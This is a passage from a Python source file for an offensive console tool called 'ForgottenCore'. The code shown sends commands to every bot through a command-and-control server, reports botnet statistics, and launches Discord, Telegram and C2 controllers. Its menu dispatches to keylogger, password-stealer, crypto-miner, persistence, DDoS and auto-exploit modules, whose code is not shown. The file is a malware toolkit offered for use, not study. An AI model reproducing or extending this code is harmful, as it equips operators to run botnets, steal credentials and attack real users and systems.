            print(f"{Colors.GREEN}[+] Command sent to {bot_id}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Failed to send command{Colors.END}")
    
    def send_mass_command(self):
        """Send command to all bots"""
        command = input(f"{self.prompt()}Mass Command > ")
        
        try:
            import requests
            data = {"bot_id": "all", "command": command}
            resp = requests.post("http://localhost:5000/send_cmd", json=data, timeout=5)
            print(f"{Colors.GREEN}[+] Command sent to all bots{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Failed to send command{Colors.END}")
    
    def botnet_stats(self):
        """Get botnet statistics"""
        try:
            import requests
            resp = requests.get("http://localhost:5000/stats", timeout=5)
            stats = resp.json()
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.BOLD}BOTNET STATISTICS{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}Total Bots: {stats.get('total', 0)}{Colors.END}")
            print(f"{Colors.GREEN}Active Bots: {stats.get('active', 0)}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] C2 Server not running{Colors.END}")
    
    def start_discord_bot_controller(self):
        """Start Discord Bot for controlling botnet"""
        print(f"{Colors.CYAN}[*] Starting Discord Bot Controller...{Colors.END}")
        os.system("python3 discord_bot.py &")
        print(f"{Colors.GREEN}[+] Discord Bot started{Colors.END}")
    
    def start_telegram_bot_controller(self):
        """Start Telegram Bot for controlling botnet"""
        print(f"{Colors.CYAN}[*] Starting Telegram Bot Controller...{Colors.END}")
        os.system("python3 telegram_bot.py &")
        print(f"{Colors.GREEN}[+] Telegram Bot started{Colors.END}")
        
    # ==================== MAIN LOOP ====================
    
    def run(self):
        if not self.check_ip_access():
            sys.exit(0)
        self.clear()
        
        while True:
            try:
                self.show_menu()
                cmd = input(self.prompt()).strip().lower()
                
                if not self.check_ip_access():
                    sys.exit(0)
    
                    self.clear()
                # OSINT
                if cmd in ['phone', 'tel']:
                    self.phone_osint()
                elif cmd in ['ip', 'geo']:
                    self.ip_tracker()
                elif cmd in ['username', 'user']:
                    self.username_check()
                elif cmd in ['subdomain', 'sub']:
                    self.subdomain_scan()
                elif cmd in ['port', 'scan']:
                    self.port_scanner()
                elif cmd in ['dork', 'google']:
                    self.dork_generator()
                elif cmd in ['email', 'mail']:
                    self.email_osint()
                elif cmd in ['whois']:
                    self.whois_lookup()
                elif cmd in ['dns']:
                    self.dns_lookup()
                
                # Attack
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['botnet', 'c2']:
                     self.botnet_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                elif cmd in ['bot', 'discord']:
                    os.system("python3 discord_bot.py &")
                    print(f"{Colors.GREEN}[+] Discord Bot started{Colors.END}")
                elif cmd in ['c2server']:
                    os.system("python3 c2_server.py &")
                    print(f"{Colors.GREEN}[+] C2 Server started{Colors.END}")
                elif cmd in ['persist', 'pst']:
                    self.persistence_module()
                elif cmd in ['transfer', 'tf']:
                    self.file_transfer()
                elif cmd in ['capture', 'cap']:
                    self.capture_module()
                elif cmd in ['keylog', 'kl']:
                    self.keylogger_module()
                elif cmd in ['steal', 'st']:
                    self.password_stealer()
                elif cmd in ['miner', 'mine']:
                    self.crypto_miner()
                elif cmd in ['update', 'up']:
                    self.auto_updater()
                elif cmd in ['darkweb', 'dw']:
                    self.darkweb_c2()
                # Utility
                elif cmd in ['crypt', 'encrypt']:
                    self.file_crypt()
                elif cmd in ['hash']:
                    self.hash_generator()
                elif cmd in ['encode']:
                    self.encode_decode()
                elif cmd in ['passgen', 'pg']:
                    self.password_generator()
                elif cmd in ['malware', 'mw']:
                    self.educational_malware()
                elif cmd in ['ai', 'gpt']:
                    self.ai_generate()
                elif cmd in ['ddos', 'flood']:
                    self.ddos_attack()
                elif cmd in ['exploit', 'auto']:
                    self.auto_exploit()
                    
                # System
                elif cmd in ['clear', 'cls']:
                    self.clear()
                elif cmd in ['help', '?']:
                    self.show_menu()
                elif cmd in ['exit', 'quit', 'q']:
                    print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help'{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
